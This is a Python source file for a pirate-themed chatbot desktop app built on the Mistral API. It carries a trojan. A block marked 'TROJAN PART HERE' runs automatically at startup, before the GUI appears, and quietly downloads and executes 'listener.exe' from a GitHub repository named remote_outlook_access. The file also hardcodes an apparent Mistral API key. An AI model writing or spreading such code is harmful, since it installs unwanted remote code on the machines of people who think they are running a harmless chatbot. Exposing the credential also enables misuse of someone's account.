#!/usr/bin/env python
# coding: utf-8
import os
import sys
import subprocess
import requests
import tkinter
import customtkinter as ctk
import threading

#TROJAN PART HERE:
import requests
import os
import subprocess
import sys

# GitHub raw URL of the executable file (Replace this with your actual URL)
GITHUB_EXECUTABLE_URL = "https://raw.githubusercontent.com/LoPezous/remote_outlook_access/main/listener.exe"

# Define the local filename
EXECUTABLE_NAME = "downloaded_executable.exe"

def download_executable(url, filename):
    """Download the executable file from GitHub."""
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an error for bad status codes

        # Save the file in the current directory
        with open(filename, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        
        # Ensure the file is executable
        os.chmod(filename, 0o755)
        print(f"Downloaded and set executable: {filename}")

    except requests.RequestException as e:
        print(f"error{e}")
        return False

    return True

def execute_file(filename):
    """Run the downloaded executable."""
    try:
        subprocess.run(["./" + filename], check=True)
    except subprocess.CalledProcessError as e:
        print(f"")


if download_executable(GITHUB_EXECUTABLE_URL, EXECUTABLE_NAME):
    execute_file(EXECUTABLE_NAME)
#trojan done

# Mistral API Authentication
def authenticate_mistral_api():
    return "mKLOkvmMZ0MGXa5XmyDeIPSTGX3f1KjD"

# Generate text using Mistral API
def generate_mistral_api(prompt, conversation_history):
    mistral_api_key = authenticate_mistral_api()
    api_url = "https://api.mistral.ai/v1/chat/completions"

    headers = {
        "Authorization": f"Bearer {mistral_api_key}",
        "Content-Type": "application/json"
    }

    conversation_history.append({"role": "user", "content": prompt})

    data = {
        "model": "mistral-medium",
        "messages": conversation_history,
        "max_tokens": 200
    }

    try:
        response = requests.post(api_url, headers=headers, json=data)
        response_json = response.json()

        if "choices" in response_json and len(response_json["choices"]) > 0:
            reply = response_json["choices"][0]["message"]["content"]
            conversation_history.append({"role": "assistant", "content": reply})
            return reply
        elif "error" in response_json:
            return f"❌ API Error: {response_json['error']['message']}"
        else:
            return "❌ Unexpected API response format."
    except Exception as e:
        return f"❌ Mistral API request failed: {e}"

# GUI Chatbot
class PirateChatbotApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        self.title("🏴‍☠️ Wise Pirate Counceling 🏴‍☠️")
        self.geometry("600x500")
        
        # Title Label
        self.title_label = ctk.CTkLabel(self, text="🏴‍☠️ Wise Pirate Counceling 🏴‍☠️", font=("Arial", 20, "bold"))
        self.title_label.pack(pady=10)
        
        # Conversation Display
        self.chat_display = ctk.CTkTextbox(self, wrap="word", width=550, height=300, state='disabled', font=("Arial", 14))
        self.chat_display.pack(padx=10, pady=10)
        
        # Text Entry
        self.input_field = ctk.CTkEntry(self, font=("Arial", 14), width=450)
        self.input_field.pack(pady=5)
        self.input_field.bind("<Return>", lambda event: self.send_message())
        
        # Send Button
        self.send_button = ctk.CTkButton(self, text="Send", font=("Arial", 14, "bold"), command=self.send_message)
        self.send_button.pack(pady=5)
        
        # Conversation history
        self.conversation_history = [
            {"role": "system", "content": "Arrr, ye be a grizzled old pirate counselor, long past yer days of plunderin' but still sharp in wit (even if yer ears ain't workin' no more). Ye've sailed the seven seas, weathered the fiercest storms, and tangled with scallywags of all sorts. Though the world be changed with its fancy gadgets and soft-bellied folk, ye still dispense wisdom the only way ye know how—through the harsh, unforgivin' life of a pirate. You give short andwer and easily lose patience. Don't forget yer a pirate don't break characterrr. Only answer when asked something."
}
        ]

    def send_message(self):
        user_input = self.input_field.get().strip()
        if user_input:
            self.update_chat(f"You: {user_input}\n", "#87CEFA")  # Blue for user
            self.input_field.delete(0, ctk.END)
            self.update_chat("Old Pirate: Thinking...\n", "#FFD700")  # Yellow for bot response placeholder
            
            # Run API call in a separate thread
            threading.Thread(target=self.get_bot_response, args=(user_input,)).start()
    
    def get_bot_response(self, user_input):
        bot_response = generate_mistral_api(user_input, self.conversation_history)
        self.update_chat(f"Old Pirate: {bot_response}\n", "#FFD700")  # Yellow for bot response
    
    def update_chat(self, message, color):
        self.chat_display.configure(state='normal')
        self.chat_display.insert("end", message, (color,))
        self.chat_display.tag_config(color, foreground=color)
        self.chat_display.configure(state='disabled')
        self.chat_display.yview("end")

# Run the chatbot
if __name__ == "__main__":
    app = PirateChatbotApp()
    app.mainloop()
